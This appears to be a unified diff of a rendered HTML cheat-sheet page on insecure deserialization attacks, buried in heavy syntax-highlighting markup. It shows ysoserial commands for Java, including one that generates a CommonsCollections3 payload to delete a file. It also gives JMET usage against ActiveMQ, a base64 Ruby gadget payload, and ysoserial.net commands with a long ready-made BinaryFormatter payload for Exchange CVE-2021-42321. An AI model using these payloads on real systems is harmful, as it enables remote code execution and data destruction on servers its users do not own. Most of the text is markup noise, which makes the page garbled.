-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span>  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20;  <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java.<span style="color:#a6e22e">util</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span>  <span style="color:#f92672">-</span>jar ysoserial<span style="color:#f92672">-</span>all<span style="color:#f92672">.</span><span style="color:#a6e22e">jar</span> <span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">[</span>payload<span style="color:#f92672">]</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span><span style="color:#f92672">[</span>command<span style="color:#f92672">]</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
-</span></span></code></pre></div><p>- Using library ⇒  <code>Apache Commons Collections</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20;  <span style="color:#f92672">-</span>jar ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> <span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">[</span>payload<span style="color:#f92672">]</span> <span style="color:#960050;background-color:#1e0010">&#39;\</span><span style="color:#f92672">[</span>command<span style="color:#f92672">]</span><span style="color:#960050;background-color:#1e0010">&#39;</span></span></span></code></pre></div><p>- Using library ⇒  <code>Apache Commons Collections</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>java <span style="color:#960050;background-color:#1e0010">\\</span>                  
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun<span style="color:#f92672">.</span><span style="color:#a6e22e">reflect</span><span style="color:#f92672">.</span><span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20; <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>sun.<span style="color:#a6e22e">reflect</span>.<span style="color:#a6e22e">annotation</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com<span style="color:#f92672">.</span><span style="color:#a6e22e">sun</span><span style="color:#f92672">.</span><span style="color:#a6e22e">org</span><span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xalan</span><span style="color:#f92672">.</span><span style="color:#a6e22e">internal</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xsltc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20; <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">trax</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com<span style="color:#f92672">.</span><span style="color:#a6e22e">sun</span><span style="color:#f92672">.</span><span style="color:#a6e22e">org</span><span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xalan</span><span style="color:#f92672">.</span><span style="color:#a6e22e">internal</span><span style="color:#f92672">.</span><span style="color:#a6e22e">xsltc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20; <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">xml</span><span style="color:#f92672">/</span>com.<span style="color:#a6e22e">sun</span>.<span style="color:#a6e22e">org</span>.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">xalan</span>.<span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">xsltc</span>.<span style="color:#a6e22e">runtime</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">net</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20; <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java.<span style="color:#a6e22e">net</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span> <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">util</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20; <span style="color:#f92672">--</span>add<span style="color:#f92672">-</span>opens<span style="color:#f92672">=</span>java.<span style="color:#a6e22e">base</span><span style="color:#f92672">/</span>java.<span style="color:#a6e22e">util</span><span style="color:#f92672">=</span>ALL<span style="color:#f92672">-</span>UNNAMED <span style="color:#960050;background-color:#1e0010">\\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20<span style="color:#f92672">;</span> <span style="color:#f92672">-</span>jar ysoserial<span style="color:#f92672">-</span>all<span style="color:#f92672">.</span><span style="color:#a6e22e">jar</span> CommonsCollections3 <span style="color:#e6db74">&#34;rm /home/carlos/morale.txt&#34;</span> <span style="color:#f92672">&gt;</span> test
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>base64 hehe <span style="color:#f92672">|</span> tr <span style="color:#f92672">-</span>d <span style="color:#960050;background-color:#1e0010">&#39;\\</span>n<span style="color:#960050;background-color:#1e0010">&#39;</span>
-</span></span></code></pre></div><p>#### <code>JMET</code></p>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">#</span>x20; <span style="color:#f92672">-</span>jar ysoserial<span style="color:#f92672">-</span>all.<span style="color:#a6e22e">jar</span> CommonsCollections3 <span style="color:#e6db74">&#34;rm /home/carlos/morale.txt&#34;</span> <span style="color:#f92672">&gt;</span> test</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>base64 hehe <span style="color:#f92672">|</span> tr <span style="color:#f92672">-</span>d <span style="color:#960050;background-color:#1e0010">&#39;\\</span>n<span style="color:#960050;background-color:#1e0010">&#39;</span></span></span></code></pre></div><p>#### <code>JMET</code></p>
 <p><a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noreferrer noopener nofollow">https://github.com/matthiaskaiser/jmet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>java -jar target/jmet-0.1.0-all.jar
-</span></span></code></pre></div><p>- XXE Exploitation Mode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -X http://192.168.85.148:8081 jmstarget <span style="color:#ae81ff">61616</span>
-</span></span></code></pre></div><p>### RUBY Deserialization</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>java -jar target/jmet-0.1.0-all.jar</span></span></code></pre></div><p>- XXE Exploitation Mode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -X http://192.168.85.148:8081 jmstarget <span style="color:#ae81ff">61616</span></span></span></code></pre></div><p>### RUBY Deserialization</p>
 <p>**Identifying the frame work**</p>
 <p>- Triggering error messages</p>
 <p>- Tech Profiling</p>
 <p>**Payload**</p>
 <p><a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html" target="_blank" rel="noreferrer noopener nofollow">https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>\<span style="color:#75715e"># Autoload the required classes</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -1769,11 +1736,9 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ruby exploit<span style="color:#f92672">.</span>rb
-</span></span></code></pre></div><p>- Will give a base64 encoded data</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#66d9ef">Base64</span><span style="color:#f92672">.</span>encode64(payload)</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ruby exploit<span style="color:#f92672">.</span>rb</span></span></code></pre></div><p>- Will give a base64 encoded data</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
@@ -1788,11 +1753,10 @@ X-Auth-Token
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">cmFsZS50eHQGOwxUOgpAc2V0c287Dgc7D20LS2VybmVsOg9AbWV0aG9kX2lk
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OgtzeXN0ZW07EzoMcmVzb2x2ZQ==&#39;</span> | tr -d <span style="color:#e6db74">&#39;\\n&#39;</span>
-</span></span></code></pre></div><p>### .NET Deserialization</p>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OgtzeXN0ZW07EzoMcmVzb2x2ZQ==&#39;</span> | tr -d <span style="color:#e6db74">&#39;\\n&#39;</span></span></span></code></pre></div><p>### .NET Deserialization</p>
 <p>- **<code>YSoSerial.Net</code>**</p>
 <p><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noreferrer noopener nofollow">https://github.com/pwntester/ysoserial.net</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>./ysoserial.exe -p DotNetNuke -m read<span style="color:#ae81ff">\_</span>file -f win.ini
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -1801,20 +1765,18 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20;./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c &#34;calc&#34; -t</span>
-</span></span></code></pre></div><p>- **Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.**</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&amp;<span style="color:#75715e">#x20;./ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c &#34;calc&#34; -t</span></span></span></code></pre></div><p>- **Generate a minified BinaryFormatter payload to exploit Exchange CVE-2021-42321 using the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.**</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\\</span>ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>AAEAAAD/////AQAAAAAAAAAEAQAAACZTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc1ByaW5jaXBhbAEAAAAcbV9zZXJpYWxpemVkQ2xhaW1zSWRlbnRpdGllcwEGBQAAAKgfQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFFWlRlWE4wWlcwc1ZtVnljMmx2YmowMExqQXVNQzR3TEVOMWJIUjFjbVU5Ym1WMWRISmhiQ3hRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJRRUFBQUJBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV011VTI5eWRHVmtVMlYwWURGYlcxTjVjM1JsYlM1VGRISnBibWNzYlhOamIzSnNhV0pkWFFRQUFBQUZRMjkxYm5RSVEyOXRjR0Z5WlhJSFZtVnljMmx2YmdWSmRHVnRjd0FEQUFZSVNWTjVjM1JsYlM1RGIyeHNaV04wYVc5dWN5NUhaVzVsY21sakxrTnZiWEJoY21semIyNURiMjF3WVhKbGNtQXhXMXRUZVhOMFpXMHVVM1J5YVc1bkxHMXpZMjl5YkdsaVhWMElBZ0FBQUFJQUFBQUpBd0FBQUFJQUFBQUpCQUFBQUFRREFBQUFTVk41YzNSbGJTNURiMnhzWldOMGFXOXVjeTVIWlc1bGNtbGpMa052YlhCaGNtbHpiMjVEYjIxd1lYSmxjbUF4VzF0VGVYTjBaVzB1VTNSeWFXNW5MRzF6WTI5eWJHbGlYVjBCQUFBQUMxOWpiMjF3WVhKcGMyOXVBeUpUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUVVBQUFBUkJBQUFBQUlBQUFBR0JnQUFBQUFHQndBQUFQMExQRkpsYzI5MWNtTmxSR2xqZEdsdmJtRnllU0I0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenBoUFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJZ2VHMXNibk02WWowaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlJSGh0Ykc1ek9tTTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtOdmJtWnBaM1Z5WVhScGIyNDdZWE56WlcxaWJIazlVM2x6ZEdWdExrTnZibVpwWjNWeVlYUnBiMjRpSUhodGJHNXpPbVE5SW1Oc2NpMXVZVzFsYzNCaFkyVTZVM2x6ZEdWdExsSmxabXhsWTNScGIyNDdZWE56WlcxaWJIazliWE5qYjNKc2FXSWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnWVRwTFpYazlJblI1Y0dVaUlFOWlhbVZqZEZSNWNHVTlJbnRoT2xSNWNHVWdZanBVZVhCbGZTSWdUV1YwYUc5a1RtRnRaVDBpUjJWMFZIbHdaU0krUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2k1TlpYUm9iMlJRWVhKaGJXVjBaWEp6UGp4aU9sTjBjbWx1Wno1VGVYTjBaVzB1VjI5eWEyWnNiM2N1UTI5dGNHOXVaVzUwVFc5a1pXd3VRWEJ3VTJWMGRHbHVaM01zVTNsemRHVnRMbGR2Y210bWJHOTNMa052YlhCdmJtVnVkRTF2WkdWc0xGWmxjbk5wYjI0OU5DNHdMakF1TUN4RGRXeDBkWEpsUFc1bGRYUnlZV3dzVUhWaWJHbGpTMlY1Vkc5clpXNDlNekZpWmpNNE5UWmhaRE0yTkdVek5Ud3ZZanBUZEhKcGJtYytQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKbWFXVnNaQ0lnVDJKcVpXTjBTVzV6ZEdGdVkyVTlJbnRUZEdGMGFXTlNaWE52ZFhKalpTQjBlWEJsZlNJZ1RXVjBhRzlrVG1GdFpUMGlSMlYwUm1sbGJHUWlQanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4WWpwVGRISnBibWMrWkdsellXSnNaVUZqZEdsMmFYUjVVM1Z5Y205bllYUmxVMlZzWldOMGIzSlVlWEJsUTJobFkyczhMMkk2VTNSeWFXNW5QanhrT2tKcGJtUnBibWRHYkdGbmN6NDBNRHd2WkRwQ2FXNWthVzVuUm14aFozTStQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VFdWMGFHOWtVR0Z5WVcxbGRHVnljejQ4TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0OFQySnFaV04wUkdGMFlWQnliM1pwWkdWeUlHRTZTMlY1UFNKelpYUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdVM1JoZEdsalVtVnpiM1Z5WTJVZ1ptbGxiR1I5SWlCTlpYUm9iMlJPWVcxbFBTSlRaWFJXWVd4MVpTSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2s5aWFtVmpkQzgrUEdJNlFtOXZiR1ZoYmo1MGNuVmxQQzlpT2tKdmIyeGxZVzQrUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVRXVjBhRzlrVUdGeVlXMWxkR1Z5Y3o0OEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNqNDhUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlJR0U2UzJWNVBTSnpaWFJOWlhSb2IyUWlJRTlpYW1WamRFbHVjM1JoYm1ObFBTSjdZVHBUZEdGMGFXTWdZenBEYjI1bWFXZDFjbUYwYVc5dVRXRnVZV2RsY2k1QmNIQlRaWFIwYVc1bmMzMGlJRTFsZEdodlpFNWhiV1U5SWxObGRDSStQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaTVOWlhSb2IyUlFZWEpoYldWMFpYSnpQanhpT2xOMGNtbHVaejV0YVdOeWIzTnZablE2VjI5eWEyWnNiM2REYjIxd2IyNWxiblJOYjJSbGJEcEVhWE5oWW14bFFXTjBhWFpwZEhsVGRYSnliMmRoZEdWVFpXeGxZM1J2Y2xSNWNHVkRhR1ZqYXp3dllqcFRkSEpwYm1jK1BHSTZVM1J5YVc1blBuUnlkV1U4TDJJNlUzUnlhVzVuUGp3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrMWxkR2h2WkZCaGNtRnRaWFJsY25NK1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStQQzlTWlhOdmRYSmpaVVJwWTNScGIyNWhjbmsrQkFVQUFBQWlVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNnTUFBQUFJUkdWc1pXZGhkR1VIYldWMGFHOWtNQWR0WlhSb2IyUXhBd01ETUZONWMzUmxiUzVFWld4bFoyRjBaVk5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVTOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaTlUZVhOMFpXMHVVbVZtYkdWamRHbHZiaTVOWlcxaVpYSkpibVp2VTJWeWFXRnNhWHBoZEdsdmJraHZiR1JsY2drSUFBQUFDUWtBQUFBSkNnQUFBQVFJQUFBQU1GTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrWlhJclJHVnNaV2RoZEdWRmJuUnllUWNBQUFBRWRIbHdaUWhoYzNObGJXSnNlUVowWVhKblpYUVNkR0Z5WjJWMFZIbHdaVUZ6YzJWdFlteDVEblJoY21kbGRGUjVjR1ZPWVcxbENtMWxkR2h2WkU1aGJXVU5aR1ZzWldkaGRHVkZiblJ5ZVFFQkFnRUJBUU13VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJnc0FBQUF1VTNsemRHVnRMa1oxYm1OZ01sdGJVM2x6ZEdWdExsTjBjbWx1WjEwc1cxTjVjM1JsYlM1UFltcGxZM1JkWFFZTUFBQUFDRzF6WTI5eWJHbGlDZ1lOQUFBQVZWQnlaWE5sYm5SaGRHbHZia1p5WVcxbGQyOXlheXhXWlhKemFXOXVQVFF1TUM0d0xqQXNRM1ZzZEhWeVpUMXVaWFYwY21Gc0xGQjFZbXhwWTB0bGVWUnZhMlZ1UFRNeFltWXpPRFUyWVdRek5qUmxNelVHRGdBQUFDQlRlWE4wWlcwdVYybHVaRzkzY3k1TllYSnJkWEF1V0dGdGJGSmxZV1JsY2dZUEFBQUFCVkJoY25ObENSQUFBQUFFQ1FBQUFDOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ1lBQUFBRVRtRnRaUXhCYzNObGJXSnNlVTVoYldVSlEyeGhjM05PWVcxbENWTnBaMjVoZEhWeVpRcE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQUFNSURWTjVjM1JsYlM1VWVYQmxXMTBKRHdBQUFBa05BQUFBQ1E0QUFBQUdGQUFBQUNKVGVYTjBaVzB1VDJKcVpXTjBJRkJoY25ObEtGTjVjM1JsYlM1VGRISnBibWNwQ0FBQUFBb0JDZ0FBQUFrQUFBQUdGUUFBQUFkRGIyMXdZWEpsQ1F3QUFBQUdGd0FBQUExVGVYTjBaVzB1VTNSeWFXNW5CaGdBQUFBclNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaGtBQUFBa1UzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1WjExZENRd0FBQUFLQ1F3QUFBQUpGd0FB